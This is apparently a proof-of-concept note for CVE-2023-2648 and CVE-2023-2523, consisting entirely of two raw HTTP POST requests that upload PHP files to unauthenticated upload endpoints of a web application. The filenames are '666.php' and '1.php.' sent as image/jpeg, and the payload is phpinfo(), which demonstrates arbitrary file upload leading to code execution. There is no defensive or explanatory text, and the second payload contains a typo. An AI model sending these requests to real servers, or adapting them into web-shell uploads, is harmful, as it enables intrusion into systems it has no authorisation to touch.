CVE-2023-2648

```
POST /inc/jquery/uploadify/uploadify.php HTTP/1.1
Host: 192.168.233.10:8082
User-Agent: test
Connection: close
Content-Length: 493
Accept-Encoding: gzip
Content-Type: multipart/form-data

------WebKitFormBoundarydRVCGWq4Cx3Sq6tt
Content-Disposition: form-data; name="Filedata"; filename="666.php"
Content-Type: application/octet-stream

<?php phpinfo();?>

------WebKitFormBoundarydRVCGWq4Cx3Sq6tt
```

**CVE-2023-2523**

```
POST /Emobile/App/Ajax/ajax.php?action=mobile_upload_save  HTTP/1.1 
Host:192.168.233.10:8082  
Cache-Control:max-age=0  
Upgrade-Insecure-Requests:1  
Origin:null  
Content-Type:multipart/form-data; boundary=----WebKitFormBoundarydRVCGWq4Cx3Sq6tt  
Accept-Encoding:gzip, deflate
Accept-Language:en-US,en;q=0.9,zh-CN;q=0.8,zh;q=0.7
Connection:close

------WebKitFormBoundarydRVCGWq4Cx3Sq6tt
Content-Disposition:form-data; name="upload_quwan"; filename="1.php."
Content-Type:image/jpeg
<?phpphpinfo();?>
------WebKitFormBoundarydRVCGWq4Cx3Sq6tt
```

